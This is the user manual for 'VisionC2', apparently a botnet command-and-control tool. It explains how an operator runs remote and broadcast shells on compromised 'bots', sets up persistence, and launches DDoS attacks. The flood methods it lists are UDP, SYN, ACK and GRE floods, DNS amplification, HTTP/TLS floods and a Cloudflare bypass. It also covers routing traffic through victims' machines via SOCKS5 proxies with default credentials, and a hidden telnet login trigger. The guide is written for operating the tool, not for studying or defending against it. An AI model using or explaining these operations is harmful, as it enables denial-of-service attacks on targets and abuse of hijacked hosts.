# ☾℣☽ VisionC2 TUI Command Reference

> Complete hotkey and command reference for the VisionC2 Terminal User Interface.

---

## 🚀 Quick Start

```bash
# Start TUI (default) 
./server

# Start split mode (telnet server)
./server --split
```

---

## 🎛️ Global Hotkeys

These work in most views:

| Key | Action |
|-----|--------|
| `↑` / `k` | Move up |
| `↓` / `j` | Move down |
| `←` / `→` | Switch tabs/views |
| `Enter` | Select / Confirm |
| `q` | Back / Quit |
| `Esc` | Cancel / Exit mode |
| `r` | Refresh data |

---

## 📊 Dashboard

The main menu screen.

| Key | Action |
|-----|--------|
| `↑/↓` | Navigate menu |
| `Enter` | Select menu item |
| `q` | Quit application |

### Menu Items

| Item | Description |
|------|-------------|
| 🤖 Bot List | View and manage connected bots |
| ⚡ Launch Attack | Interactive attack builder |
| 📊 Ongoing Attacks | Monitor active attacks |
| 🧦 Socks Manager | SOCKS5 proxy management |
| 📜 Connection Logs | Bot connection history |
| ❓ Help | In-app help guide |

---

## 🤖 Bot List View

View all connected bots with live status.

### Display Columns

| Column | Description |
|--------|-------------|
| ID | 8-character bot identifier |
| IP | Bot's IP address and port |
| Arch | CPU architecture (amd64, arm64, etc.) |
| RAM | System memory in MB |
| Uptime | Time since bot connected |

### Hotkeys

| Key | Action | Description |
|-----|--------|-------------|
| `Enter` | Remote Shell | Open interactive shell to selected bot |
| `b` | Broadcast Shell | Open shell to ALL bots |
| `l` | Launch Attack | Attack using selected bot |
| `i` | Info | Request `!info` from selected bot |
| `p` | Persist | Send `!persist` (prompts confirmation) |
| `r` | Reinstall | Send `!reinstall` (prompts confirmation) |
| `k` | Kill | Send `!lolnogtfo` (requires y/n) |
| `q` | Back | Return to dashboard |

### Confirmation Prompts

For dangerous commands (`p`, `r`, `k`), you'll see:

```
⚠ Send !persist to bot a1b2c3d4? [y/n]
```

Press `y` to confirm or `n`/`Esc` to cancel.

---

## 💻 Remote Shell View

Interactive shell session with a single bot.

### Interface

```
💻 REMOTE SHELL
Bot: a1b2c3d4     │ Arch: amd64
────────────────────────────────────────────────

[command output appears here]

root@bot:~$ █
```

### Hotkeys

| Key | Action | Description |
|-----|--------|-------------|
| `Enter` | Send | Execute typed command |
| `Ctrl+F` | Clear | Clear shell history |
| `Ctrl+P` | Persist | Send `!persist` (confirms) |
| `Ctrl+R` | Reinstall | Send `!reinstall` (confirms) |
| `Esc` | Exit | Return to bot list |

### Command Types

| Prefix | Behavior |
|--------|----------|
| (none) | Sent as `!shell <cmd>` - waits for output |
| `!` | Sent directly (e.g., `!info`, `!detach ls`) |

---

## 📡 Broadcast Shell View

Send commands to multiple bots simultaneously.

### Interface

```
📡 BROADCAST SHELL                              [47 bots]
────────────────────────────────────────────────

Filter: All Bots

broadcast:~$ █
```

### Hotkeys

| Key | Action | Description |
|-----|--------|-------------|
| `Enter` | Send | Execute to all filtered bots |
| `Ctrl+F` | Clear | Clear shell history |
| `Ctrl+A` | Arch Filter | Filter by architecture |
| `Ctrl+G` | RAM Filter | Filter by minimum RAM |
| `Ctrl+B` | Max Bots | Limit number of targets |
| `Ctrl+P` | Persist All | Send `!persist` to all (confirms) |
| `Ctrl+R` | Reinstall All | Send `!reinstall` to all (confirms) |
| `Ctrl+K` | Kill All | Send `!lolnogtfo` to all (confirms) |
| `Esc` | Exit | Return to bot list |

### Targeting Filters

**Architecture Filter (`Ctrl+A`):**

```
Filter by Arch: amd64█
```

Enter architecture name (amd64, arm64, mips, etc.) or leave empty for all.

**RAM Filter (`Ctrl+G`):**

```
Min RAM (MB): 1024█
```

Only target bots with at least this much RAM.

**Max Bots (`Ctrl+B`):**

```
Max Bots: 10█
```

Limit commands to first N matching bots.

---

## ⚡ Launch Attack View

Interactive attack configuration form.

### Interface

```
⚡ LAUNCH ATTACK

▸ Method:    [!udpflood          ▼]
  Target:    192.168.1.100
  Port:      80
  Duration:  60

[tab] Next  [enter] Select Method  [l] Launch  [q] Cancel
```

### Hotkeys

| Key | Action |
|-----|--------|
| `Tab` | Next field |
| `Enter` | Open method selector (when on Method) |
| `l` | Launch attack |
| `q` | Cancel and go back |
| `Backspace` | Delete character |

### Attack Methods

#### Layer 4 (Network)

| Method | Description |
|--------|-------------|
| `!udpflood` | UDP packet flood |
| `!tcpflood` | TCP connection flood |
| `!syn` | SYN flood attack |
| `!ack` | ACK flood attack |
| `!gre` | GRE protocol flood |
| `!dns` | DNS amplification |

#### Layer 7 (Application)

| Method | Description |
|--------|-------------|
| `!http` | HTTP GET/POST flood |
| `!https` | HTTPS/TLS flood |
| `!tls` | TLS flood (alias) |
| `!cfbypass` | Cloudflare bypass |

### Method Selector

Press `Enter` on the Method field to open:

```
SELECT ATTACK METHOD

Layer 4:
  ▸ !udpflood    UDP packet flood
    !tcpflood    TCP connection flood
    !syn         SYN flood attack
    ...

[↑/↓] Navigate  [enter] Select  [q] Cancel
```

---

## 📊 Ongoing Attacks View

Monitor and manage active attacks.

### Interface

```
ONGOING ATTACKS                                 [2 active]

!udpflood → 192.168.1.100:80    ████████░░  45s left
!https    → example.com:443     ██████████  2m 30s left

[s] Stop All  [r] Refresh  [q] Back
```

### Hotkeys

| Key | Action |
|-----|--------|
| `s` | Stop all attacks |
| `r` | Refresh status |
| `q` | Back to dashboard |

---

## 🧦 Socks Manager View

Manage SOCKS5 reverse proxies through bots.

### Interface

```
🧦 SOCKS5 PROXY MANAGER

[All Bots]  Active Socks   Stopped
────────────────────────────────────────────────

Bots: 47   Active Proxies: 3   Bind: 0.0.0.0

BOT ID          IP              ARCH      PORT    STATUS
────────────────────────────────────────────────────────
▸ a1b2c3d4     192.168.1.100   amd64     1080    ● ACTIVE
  e5f6g7h8     10.0.0.50       arm64     1080    ● ACTIVE
  x9y8z7w6     172.16.0.25     mips      -       - NONE
```

### View Modes

| Tab | Shows |
|-----|-------|
| All Bots | Every connected bot |
| Active Socks | Bots with running proxies |
| Stopped | Bots with stopped proxies |

### Hotkeys

| Key | Action | Description |
|-----|--------|-------------|
| `↑/↓` | Navigate | Select bot |
| `←/→` | Switch View | Change tab |
| `s` | Start Socks | Start proxy on selected bot |
| `x` | Stop Socks | Stop proxy on selected bot |
| `r` | Refresh | Update status |
| `q` | Back | Return to dashboard |

### Starting a Proxy

1. Select a bot with `↑/↓`
2. Press `s`
3. Enter port (default: 1080)
4. Press `Enter`

```
START SOCKS5 PROXY
Bot: a1b2c3d4
▸ Port: 1080█

[enter] Start  [esc] Cancel
```

### SOCKS5 Authentication

The proxy supports username/password authentication (RFC 1929). Credentials are set in `bot/config.go` (`socksUsername` / `socksPassword`) and can be updated at runtime:

- From TUI Socks Manager or remote shell: `!socksauth <user> <pass>`
- Leave both empty to allow unauthenticated access

### Using the Proxy

After starting, connect via:

```bash
# With authentication (default: visionc2 / synackrst666)
curl --socks5-basic -U visionc2:synackrst666 --socks5 BOT_IP:1080 http://example.com

# Configure proxychains
echo "socks5 BOT_IP 1080 visionc2 synackrst666" >> /etc/proxychains.conf

# Without auth (if credentials are empty)
curl --socks5 BOT_IP:1080 http://example.com
```

---

## 📜 Connection Logs View

View bot connection and disconnection history.

### Interface

```
CONNECTION LOGS

[All]  Connections   Disconnections
────────────────────────────────────────────────

14:32:05  CONNECT     a1b2c3d4    192.168.1.100    amd64
14:30:22  DISCONNECT  x9y8z7w6    172.16.0.25      mips
14:28:15  CONNECT     e5f6g7h8    10.0.0.50        arm64
```

### View Modes

| Tab | Shows |
|-----|-------|
| All | All events |
| Connections | New bot connections only |
| Disconnections | Bot disconnections only |

### Hotkeys

| Key | Action |
|-----|--------|
| `←/→` | Switch filter |
| `r` | Refresh logs |
| `q` | Back to dashboard |

---

## ❓ Help View

In-app help with navigation sections.

### Hotkeys

| Key | Action |
|-----|--------|
| `←/→` or `h/l` | Navigate sections |
| `q` | Back to dashboard |

---

## 🔧 Split Mode Commands

When running `./cnc --split`, connect via netcat/telnet:

```bash
nc YOUR_SERVER 420
```

### Authentication

1. Type trigger word: `spamtec`
2. Enter username and password

### Available Commands

| Command | Description |
|---------|-------------|
| `help` | Show command menu |
| `attack` / `methods` | List attack methods |
| `bots` | List connected bots |
| `ongoing` | Show active attacks |
| `clear` / `cls` | Clear screen |
| `banner` | Show banner |
| `logout` / `exit` | Disconnect |

### Attack Syntax

```
!<method> <target> <port> <duration>
```

### Shell Commands

| Command | Description |
|---------|-------------|
| `!shell <cmd>` | Execute with output |
| `!detach <cmd>` | Execute in background |
| `!exec <cmd>` | Alias for !shell |

### Bot Management

| Command | Description |
|---------|-------------|
| `!info` | Get bot system info |
| `!persist` | Setup persistence |
| `!reinstall` | Force reinstall |
| `!lolnogtfo` | Kill bots |

### Targeting Specific Bot

```
!<botid> <command>
```

Example: `!a1b2c3d4 !shell whoami`

### SOCKS Proxy

| Command | Description |
|---------|-------------|
| `!socks <port>` | Start SOCKS5 on port |
| `!stopsocks` | Stop all proxies |
| `!socksauth <user> <pass>` | Update SOCKS5 proxy credentials |

---

## 📋 Quick Reference Card

```
┌─────────────────────────────────────────────────────────────────┐
│                    VisionC2 TUI Quick Reference                 │
├─────────────────────────────────────────────────────────────────┤
│ GLOBAL                                                          │
│   ↑/↓/j/k   Navigate          Enter    Select/Confirm          │
│   ←/→       Switch tabs       q        Back/Quit                │
│   r         Refresh           Esc      Cancel                   │
├─────────────────────────────────────────────────────────────────┤
│ BOT LIST                                                        │
│   Enter     Remote shell      b        Broadcast shell          │
│   l         Launch attack     i        Request info             │
│   p         Persist (y/n)     r        Reinstall (y/n)          │
│   k         Kill bot (y/n)                                      │
├─────────────────────────────────────────────────────────────────┤
│ REMOTE SHELL                                                    │
│   Ctrl+F    Clear output      Ctrl+P   Persist                  │
│   Ctrl+R    Reinstall         Esc      Exit shell               │
├─────────────────────────────────────────────────────────────────┤
│ BROADCAST SHELL                                                 │
│   Ctrl+A    Filter arch       Ctrl+G   Filter RAM               │
│   Ctrl+B    Max bots          Ctrl+K   Kill all                 │
│   Ctrl+P    Persist all       Ctrl+R   Reinstall all            │
├─────────────────────────────────────────────────────────────────┤
│ ATTACK VIEW                                                     │
│   Tab       Next field        Enter    Select method            │
│   l         Launch attack     q        Cancel                   │
├─────────────────────────────────────────────────────────────────┤
│ SOCKS MANAGER                                                   │
│   s         Start socks       x        Stop socks               │
│   ←/→       Switch view       r        Refresh                  │
│   Auth: !socksauth <user> <pass> (via shell)                    │
├─────────────────────────────────────────────────────────────────┤
│ ONGOING ATTACKS                                                 │
│   s         Stop all attacks  r        Refresh                  │
└─────────────────────────────────────────────────────────────────┘
```

---

## ⚠️ Notes

- TUI requires minimum terminal size of 80x24
- All bot commands are logged server-side
- Dangerous commands (persist, reinstall, kill) require confirmation
- Dead bots are automatically cleaned up after 5 minutes

---

*VisionC2 - ☾℣☽*
